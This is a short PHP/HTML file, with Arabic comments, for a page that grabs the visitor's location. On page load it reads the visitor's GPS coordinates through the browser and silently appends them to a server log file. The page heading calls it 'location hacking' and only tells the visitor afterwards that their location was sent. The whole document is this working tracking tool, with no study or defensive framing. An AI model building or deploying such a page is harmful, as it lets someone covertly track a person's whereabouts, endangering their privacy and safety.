<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // استلام بيانات الموقع
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];

    // تخزين البيانات في ملف نصي
    $log = "location_log.txt";
    $data = "Latitude: $latitude, Longitude: $longitude\n";
    file_put_contents($log, $data, FILE_APPEND);

    // رسالة تأكيد
    echo "Location saved successfully!";
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker</title>
    <script>
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // إرسال البيانات إلى الخادم باستخدام طلب POST
                    const formData = new FormData();
                    formData.append('latitude', latitude);
                    formData.append('longitude', longitude);

                    fetch('', { // إرسال إلى نفس الملف
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.text())
                    .then(data => {
                        console.log("Response:", data);
                    })
                    .catch(error => {
                        console.error("Error sending location:", error);
                    });
                });
            } else {
                alert("Geolocation is not supported by your browser.");
            }
        }

        // إرسال الموقع بمجرد فتح الصفحة
        window.onload = sendLocation;
    </script>
</head>
<body>
    <h1>Your Location hacking</h1>
    <p>If you see this page, your location has been sent.</p>
</body>
</html>
